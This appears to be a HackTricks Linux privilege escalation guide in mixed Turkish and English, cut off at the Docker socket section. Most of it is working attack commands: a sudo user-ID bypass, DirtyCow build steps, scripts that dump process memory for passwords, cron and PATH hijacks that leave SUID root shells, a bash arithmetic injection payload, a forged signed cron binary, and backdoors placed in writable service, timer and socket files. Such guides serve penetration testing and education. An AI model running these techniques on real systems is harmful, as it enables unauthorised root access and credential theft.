# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Sistem Bilgileri

### OS bilgisi

Çalışan OS hakkında bilgi edinmeye başlayalım.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Eğer **have write permissions on any folder inside the `PATH`** varsa bazı libraries veya binaries hijack edebilirsiniz:
```bash
echo $PATH
```
### Env info

Çevresel değişkenlerde ilginç bilgiler, parolalar veya API anahtarları var mı?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Kernel sürümünü kontrol edin ve privilege escalation için kullanılabilecek herhangi bir exploit olup olmadığını araştırın.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Burada iyi bir zafiyetli kernel listesi ve bazı zaten **compiled exploits** bulabilirsiniz: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) ve [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Bazı **compiled exploits** bulabileceğiniz diğer siteler: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Bu siteden tüm zafiyetli kernel sürümlerini çıkarmak için şunu yapabilirsiniz:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
kernel exploits araması için yardımcı olabilecek araçlar:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (victimde çalıştırın, yalnızca kernel 2.x için exploits kontrol eder)

Her zaman **kernel sürümünü Google'da arayın**, belki kernel sürümünüz bazı kernel exploit'lerinde yazılıdır ve böylece bu exploit'in geçerli olduğundan emin olursunuz.

Ek kernel exploitation teknikleri:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo sürümü

Aşağıda görünen güvenlik açığı bulunan sudo sürümlerine göre:
```bash
searchsploit sudo
```
Bu grep'i kullanarak sudo sürümünün zayıf olup olmadığını kontrol edebilirsiniz.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

1.9.17p1'den önceki Sudo sürümleri (**1.9.14 - 1.9.17 < 1.9.17p1**) ayrıcalıksız yerel kullanıcıların, kullanıcı tarafından kontrol edilen bir dizinden `/etc/nsswitch.conf` dosyası kullanıldığında sudo `--chroot` seçeneği aracılığıyla ayrıcalıklarını root'a yükseltmesine olanak tanır.

O [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot), o [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) için exploit amaçlı kullanılabilir. Exploit'i çalıştırmadan önce `sudo` sürümünüzün vulnerable olduğunu ve `chroot` özelliğini desteklediğini doğrulayın.

Daha fazla bilgi için orijinal [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) kaynağına başvurun.

#### sudo < v1.8.28

Kaynak: @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg signature verification failed

Bu vuln'ün nasıl exploit edilebileceğine dair bir **örnek** için **smasher2 box of HTB**'i kontrol edin.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Daha fazla sistem keşfi
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Olası savunmaları listeleyin

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Eğer bir docker container içindeyseniz, ondan kaçmayı deneyebilirsiniz:


{{#ref}}
docker-security/
{{#endref}}

## Sürücüler

Neyin **what is mounted and unmounted** olduğunu, nerede ve neden olduğunu kontrol edin. Eğer herhangi bir şey unmounted ise, onu mount etmeyi deneyebilir ve özel bilgileri kontrol edebilirsiniz.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Kullanışlı yazılımlar

Kullanışlı binaries dosyalarını listeleyin
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Ayrıca, **herhangi bir derleyicinin yüklü olup olmadığını** kontrol edin. Bu, bazı kernel exploit'leri kullanmanız gerekirse yararlıdır; çünkü bunları kullanacağınız makinede (veya benzer birinde) derlemeniz önerilir.
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Kurulu Zafiyetli Yazılımlar

Kurulu paketlerin ve servislerin **sürümlerini** kontrol edin. Örneğin, eski bir Nagios sürümü olabilir; bu sürüm exploited edilerek escalating privileges elde edilebilir…\
Daha şüpheli yüklü yazılımların sürümlerini manuel olarak kontrol etmeniz önerilir.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.

> [!NOTE] > _Note that these commands will show a lot of information that will mostly be useless, therefore it's recommended some applications like OpenVAS or similar that will check if any installed software version is vulnerable to known exploits_

## Processes

Take a look at **what processes** are being executed and check if any process has **more privileges than it should** (maybe a tomcat being executed by root?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Also **check your privileges over the processes binaries**, maybe you can overwrite someone.

### Süreç izleme

İşlemleri izlemek için [**pspy**](https://github.com/DominicBreuker/pspy) gibi araçları kullanabilirsiniz. Bu, sık çalıştırılan veya belirli gereksinimler karşılandığında çalışan zayıf süreçleri tespit etmek için çok faydalı olabilir.

### Süreç belleği

Bir sunucunun bazı servisleri **kimlik bilgilerini bellek içinde düz metin olarak** saklayabilir.\
Normalde başka kullanıcılara ait süreçlerin belleğini okumak için **root ayrıcalıkları** gerekir; bu yüzden bu genellikle zaten root olduğunuzda ve daha fazla kimlik bilgisi keşfetmek istediğinizde daha kullanışlıdır.\
Ancak unutmayın ki **normal bir kullanıcı olarak sahip olduğunuz süreçlerin belleğini okuyabilirsiniz**.

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: aynı uid'ye sahip oldukları sürece tüm süreçler debuglanabilir. Bu, ptrace'in klasik çalışma şeklidir.
> - **kernel.yama.ptrace_scope = 1**: sadece ebeveyn süreç debuglanabilir.
> - **kernel.yama.ptrace_scope = 2**: Sadece admin ptrace kullanabilir, çünkü CAP_SYS_PTRACE yetkisi gerektirir.
> - **kernel.yama.ptrace_scope = 3**: Hiçbir süreç ptrace ile izlenemez. Bir kez ayarlandığında, ptrace'i tekrar etkinleştirmek için reboot (yeniden başlatma) gerekir.

#### GDB

If you have access to the memory of an FTP service (for example) you could get the Heap and search inside of its credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Betiği
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Belirli bir işlem kimliği için, **maps, belleğin o işlemin sanal adres uzayında nasıl haritalandığını gösterir**; ayrıca her haritalanmış bölgenin **izinlerini gösterir**. **mem** pseudo dosyası **işlemin belleğinin kendisini ortaya çıkarır**. **maps** dosyasından hangi **bellek bölgelerinin okunabilir olduğunu** ve bunların offset'lerini biliriz. Bu bilgiyi kullanarak **mem** dosyasında seek yapıp tüm okunabilir bölgeleri bir dosyaya dump'larız.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` sistemin **fiziksel** belleğine erişim sağlar, sanal belleğe değil. kernel'in sanal adres alanına /dev/kmem kullanılarak erişilebilir.\
Genellikle, `/dev/mem` yalnızca **root** ve **kmem** grubunca okunabilir.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump, Windows için Sysinternals araç setindeki klasik ProcDump aracının Linux için yeniden tasarlanmış halidir. Şuradan edinin: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Araçlar

Bir process'in belleğini dump etmek için şunları kullanabilirsiniz:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_root gereksinimlerini manuel olarak kaldırabilir ve size ait olan process'i dump edebilirsiniz
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root gereklidir)

### Process Belleğinden Kimlik Bilgileri

#### Manuel örnek

If you find that the authenticator process is running:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Process'i dump edebilirsiniz (önceki bölümlere bakarak bir process'in belleğini dump etmenin farklı yollarını bulabilirsiniz) ve bellekte kimlik bilgilerini arayabilirsiniz:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Araç [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **bellekten düz metin kimlik bilgilerini** ve bazı **iyi bilinen dosyaları** çalacaktır. Doğru çalışması için root ayrıcalıkları gerektirir.

| Özellik                                           | İşlem Adı            |
| ------------------------------------------------- | -------------------- |
| GDM parolası (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Aktif FTP Bağlantıları)                   | vsftpd               |
| Apache2 (Aktif HTTP Basic Auth Oturumları)        | apache2              |
| OpenSSH (Aktif SSH Oturumları - sudo Kullanımı)   | sshd:                |

#### Arama Regexleri/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zamanlanmış/Cron işleri

### Crontab UI (alseambusher) root olarak çalışıyorsa – web tabanlı scheduler privesc

Eğer bir web “Crontab UI” paneli (alseambusher/crontab-ui) root olarak çalışıyor ve yalnızca loopback'e bağlıysa, yine de SSH local port-forwarding ile ona ulaşabilir ve ayrıcalıklı bir görev oluşturarak yükseltebilirsiniz.

Tipik zincir
- Sadece loopback'e bağlı portu keşfet (ör. 127.0.0.1:8000) ve Basic-Auth realm'i `ss -ntlp` / `curl -v localhost:8000` ile tespit et
- Kimlik bilgilerini operasyonel artefaktlarda bul:
- Yedekler/scriptler içinde `zip -P <password>`
- systemd unit'ında ortaya çıkan `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tünelle ve giriş yap:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Yüksek ayrıcalıklı bir job oluştur ve hemen çalıştır (SUID shell bırakır):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Kullanın:
```bash
/tmp/rootshell -p   # root shell
```
Sertleştirme
- Crontab UI'yi root olarak çalıştırmayın; özel bir kullanıcı ve asgari izinlerle sınırlandırın
- localhost'a bağlayın ve ayrıca erişimi firewall/VPN ile kısıtlayın; parolaları yeniden kullanmayın
- unit dosyalarına gizli bilgileri gömmekten kaçının; secret stores veya sadece root erişimli EnvironmentFile kullanın
- Talep üzerine çalışan job'lar için audit/logging'i etkinleştirin



Herhangi bir scheduled job'un zafiyeti olup olmadığını kontrol edin. Belki root tarafından çalıştırılan bir script'ten faydalanabilirsiniz (wildcard vuln? root'un kullandığı dosyaları değiştirebilir misiniz? symlinks kullanmak? root'un kullandığı dizinde belirli dosyalar oluşturmak?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron yolu

Örneğin, _/etc/crontab_ içinde şu PATH'i bulabilirsiniz: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Dikkat: "user" kullanıcısının /home/user üzerinde yazma yetkisine sahip olduğuna dikkat edin_)

Eğer bu crontab içinde root kullanıcısı PATH'i ayarlamadan bir komut veya script çalıştırmaya çalışıyorsa. Örneğin: _\* \* \* \* root overwrite.sh_\
O zaman, root shell elde etmek için şunu kullanabilirsiniz:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron ile joker karakter içeren bir betik kullanımı (Wildcard Injection)

Bir betik root tarafından çalıştırılıyor ve bir komutun içinde “**\***” varsa, bunu beklenmeyen şeyler (ör. privesc) yapmak için istismar edebilirsiniz. Örnek:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Wildcard aşağıdaki gibi bir yolun önünde ise** _**/some/path/\***_ **, bu zafiyete sahip değildir (hatta** _**./\***_ **de değildir).**

Daha fazla wildcard exploitation tricks için aşağıdaki sayfayı okuyun:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash, ((...)), $((...)) ve let içindeki aritmetik değerlendirmeden önce parameter/variable expansion ve command substitution işlemlerini gerçekleştirir. Eğer root cron/parser güvenilmeyen log alanlarını okuyup bunları bir aritmetik bağlama veriyorsa, bir saldırgan $(...) biçiminde bir command substitution enjekte edebilir ve cron çalıştığında bu root olarak yürütülür.

- Neden işe yarar: Bash'te genişletmeler şu sırayla gerçekleşir: parameter/variable expansion, command substitution, arithmetic expansion, ardından word splitting ve pathname expansion. Bu yüzden `$(/bin/bash -c 'id > /tmp/pwn')0` gibi bir değer önce substitute edilir (komut çalıştırılır), sonra geriye kalan sayısal `0` aritmetik için kullanılır ve script hata olmadan devam eder.

- Tipik zafiyetli örüntü:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- İstismar: Parse edilen log'a saldırgan kontrolündeki metni yazdırın, böylece sayısal görünen alan bir command substitution içersin ve bir rakamla bitsin. Komutunuz stdout'a yazmasın (veya yönlendirin) ki aritmetik geçerli kalsın.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Eğer **bir root tarafından çalıştırılan cron script'ini değiştirebiliyorsanız**, çok kolay bir şekilde shell elde edebilirsiniz:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Eğer root tarafından çalıştırılan betik **tam erişiminiz olan bir dizini** kullanıyorsa, o klasörü silmek ve sizin kontrolünüzde bir betiği çalıştıran başka bir dizine işaret eden bir **symlink klasörü oluşturmak** faydalı olabilir.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Yazılabilir payloads içeren özel imzalı cron ikili dosyaları
Blue takımları bazen cron tarafından tetiklenen ikili dosyaları root olarak çalıştırmadan önce özel bir ELF bölümü döküp vendor string için grep yaparak "sign" ederler. Eğer bu ikili group-writable ise (ör. `/opt/AV/periodic-checks/monitor` sahibi `root:devs 770`) ve signing material'ı leak edebiliyorsanız, bölümü sahteleyip cron görevini ele geçirebilirsiniz:

1. Doğrulama akışını yakalamak için `pspy` kullanın. Era'da root `objcopy --dump-section .text_sig=text_sig_section.bin monitor` çalıştırdı, ardından `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` çalıştırdı ve sonra dosyayı yürüttü.
2. Beklenen sertifikayı leaked key/config (from `signing.zip`) kullanarak yeniden oluşturun:
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Kötü amaçlı bir ikame oluşturun (ör. SUID bash bırakmak, SSH anahtarınızı eklemek) ve sertifikayı `.text_sig` içine gömün ki grep geçsin:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Çalıştırma bitlerini koruyarak planlanmış ikiliyi üzerine yazın:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Bir sonraki cron çalışmasını bekleyin; basit imza kontrolü başarılı olduğunda payload'ınız root olarak çalışır.

### Frequent cron jobs

Süreçleri, her 1, 2 veya 5 dakikada bir çalıştırılan prosesleri aramak için izleyebilirsiniz. Belki bundan faydalanıp ayrıcalıkları yükseltebilirsiniz.

For example, to **monitor every 0.1s during 1 minute**, **sort by less executed commands** and delete the commands that have been executed the most, you can do:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Ayrıca kullanabilirsiniz** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (bu başlayan her process'i izleyecek ve listeleyecektir).

### Görünmez cron jobs

Bir cronjob oluşturmak mümkündür: bir yorumdan sonra **carriage return koyarak** (newline karakteri olmadan) cron job çalışacaktır. Örnek (carriage return char'ına dikkat):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Servisler

### Yazılabilir _.service_ dosyaları

Herhangi bir `.service` dosyasına yazıp yazamayacağınızı kontrol edin; yazabiliyorsanız, onu **değiştirerek** servis **başlatıldığında**, **yeniden başlatıldığında** veya **durdurulduğunda** **backdoor**'unuzun **çalışmasını** sağlayabilirsiniz (belki makinenin yeniden başlatılmasını beklemeniz gerekir).\
Örneğin backdoor'unuzu `.service` dosyasının içine **`ExecStart=/tmp/script.sh`** ile oluşturun

### Yazılabilir servis ikili dosyaları

Unutmayın ki, eğer **servisler tarafından çalıştırılan ikili dosyalar üzerinde yazma izniniz** varsa, bunları backdoor'lar için değiştirebilir ve servisler yeniden çalıştırıldıklarında backdoor'lar da çalıştırılır.

### systemd PATH - Göreceli Yollar

systemd tarafından kullanılan PATH'i şu komutla görebilirsiniz:
```bash
systemctl show-environment
```
Eğer yolun herhangi bir klasörüne **write** yazabildiğinizi fark ederseniz, **escalate privileges** yapabilirsiniz. Hizmet yapılandırma dosyalarında kullanılan **göreli yolları** aramanız gerekir, örneğin:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Sonra, yazma izniniz olan systemd PATH klasörünün içine, **göreli yol binary ile aynı ada sahip** bir **çalıştırılabilir dosya** oluşturun, ve servis kırılgan eylemi (**Start**, **Stop**, **Reload**) yürütmesi istendiğinde, sizin **backdoor**'unuz çalıştırılacaktır (ayrıcalıksız kullanıcılar genellikle servisleri başlatamaz/durduramaz ama `sudo -l` kullanıp kullanamayacağınıza bakın).

**Servisler hakkında daha fazla bilgi için `man systemd.service` komutuna bakın.**

## **Zamanlayıcılar**

**Timers**, adı `**.timer**` ile biten ve `**.service**` dosyalarını veya olayları kontrol eden systemd unit dosyalarıdır. **Timers**, takvim zamanı olayları ve monotonik zaman olayları için yerleşik desteğe sahip oldukları ve asenkron çalıştırılabildikleri için cron'a alternatif olarak kullanılabilir.

Tüm zamanlayıcıları şu komutla listeleyebilirsiniz:
```bash
systemctl list-timers --all
```
### Yazılabilir zamanlayıcılar

Eğer bir zamanlayıcıyı değiştirebiliyorsanız, systemd.unit içindeki bazı mevcut birimleri (ör. `.service` veya `.target`) çalıştırmasını sağlayabilirsiniz.
```bash
Unit=backdoor.service
```
Dokümantasyonda Unit'in ne olduğu şu şekilde açıklanır:

> Bu timer süresi dolduğunda etkinleştirilecek unit. Argüman, son eki ".timer" olmayan bir unit adıdır. Belirtilmezse, bu değer timer unit ile aynı ada sahip, sadece son eki farklı olan bir service olarak varsayılır. (Yukarıya bakınız.) Etkinleştirilen unit adı ile timer unit adı, son ek dışında aynı olacak şekilde isimlendirilmesi önerilir.

Bu izni kötüye kullanmak için şunları yapmanız gerekir:

- Bir systemd unit (örn. `.service`) bulun; bu unit **executing a writable binary** olmalı
- **executing a relative path** kullanan ve **systemd PATH** üzerinde o yürütülebilir dosya için **writable privileges**'a sahip olduğunuz bir systemd unit bulun (o yürütülebilir dosyayı taklit etmek için)

**Timers hakkında daha fazla bilgi edinmek için `man systemd.timer` komutuna bakın.**

### **Timer'ı Etkinleştirme**

Bir timer'ı etkinleştirmek için root ayrıcalıklarına sahip olmanız ve şu komutu çalıştırmanız gerekir:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) client-server modellerinde aynı veya farklı makineler arasında **süreçler arası iletişim** sağlar. Bilgisayarlar arası iletişim için standart Unix dosya tanımlayıcılarını kullanır ve `.socket` dosyalarıyla kurulurlar.

Sockets can be configured using `.socket` files.

**Learn more about sockets with `man systemd.socket`.** Bu dosya içinde yapılandırılabilecek birkaç ilginç parametre vardır:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Bu seçenekler farklıdır ama özet olarak soketin nerede dinleyeceğini belirtmek için kullanılır (AF_UNIX soket dosyasının yolu, IPv4/6 ve/veya dinlenecek port numarası vb.)
- `Accept`: Boolean bir argüman alır. Eğer **true** ise, **her gelen bağlantı için bir service instance başlatılır** ve yalnızca bağlantı soketi ona geçirilir. Eğer **false** ise, tüm dinleme soketleri **başlatılan service unit'a geçirilir** ve tüm bağlantılar için yalnızca bir service unit oluşturulur. Bu değer datagram soketleri ve FIFO'lar için yoksayılır; bu türlerde tek bir service unit koşulsuz olarak tüm gelen trafiği işler. Varsayılan `false`'dur. Performans nedenleriyle, yeni daemon'ların `Accept=no` için uygun şekilde yazılması önerilir.
- `ExecStartPre`, `ExecStartPost`: Bir veya daha fazla komut satırı alır; bunlar dinleme **sockets**/FIFO'lar **oluşturulup** bağlanmadan önce veya **sonra** sırasıyla **çalıştırılır**. Komut satırının ilk token'i mutlak bir dosya adı olmalı, ardından süreç için argümanlar gelir.
- `ExecStopPre`, `ExecStopPost`: Dinleme **sockets**/FIFO'lar **kapatılıp** kaldırılmadan önce veya sonra sırasıyla **çalıştırılan** ek **komutlar**.
- `Service`: Gelen trafik üzerine **aktive edilecek** `service` unit adını belirtir. Bu ayar yalnızca `Accept=no` olan soketler için izinlidir. Varsayılan olarak soket ile aynı ada sahip olan service (sonek değiştirilmiş olarak) kullanılır. Çoğu durumda bu seçeneğin kullanılması gerekli değildir.

### Writable .socket files

Eğer yazılabilir bir `.socket` dosyası bulursanız, `[Socket]` bölümünün başına `ExecStartPre=/home/kali/sys/backdoor` gibi bir satır **ekleyebilir** ve backdoor soket oluşturulmadan önce çalıştırılacaktır. Bu nedenle, muhtemelen makinenin yeniden başlatılmasını **beklemeniz gerekecektir.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Writable sockets

Eğer herhangi bir yazılabilir socket tespit ederseniz (_şimdi config `.socket` dosyalarından değil, Unix Sockets'ten bahsediyoruz_), o soketle **iletişim kurabilir** ve belki bir zayıflıktan faydalanabilirsiniz.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Ham bağlantı
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Bazı **HTTP için dinleyen socket'ler** olabilir (_.socket dosyalarından değil, unix sockets olarak hareket eden dosyalardan bahsediyorum_). Bunu şu komutla kontrol edebilirsiniz:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Eğer soket bir **HTTP isteğine yanıt veriyorsa**, onunla **iletişim kurabilir** ve belki de **bazı açıklıkları exploit edebilirsiniz**.

### Yazılabilir Docker Soket

Docker soketi, genellikle `/var/run/docker.sock` konumunda bulunan ve güvence altına alınması gereken kritik bir dosyadır. Varsayılan olarak, `root` kullanıcısı ve `docker` grubunun üyeleri tarafından yazılabilir. Bu sokete yazma erişimine sahip olmak privilege escalation'a yol açabilir. Aşağıda bunun nasıl yapılabileceğinin ve Docker CLI mevcut değilse alternatif yöntemlerin bir dökümü bulunuyor.

#### **Privilege Escalation with Docker CLI**

If you have write access to the Docker socket, you can escalate privileges using the following commands:
```bash
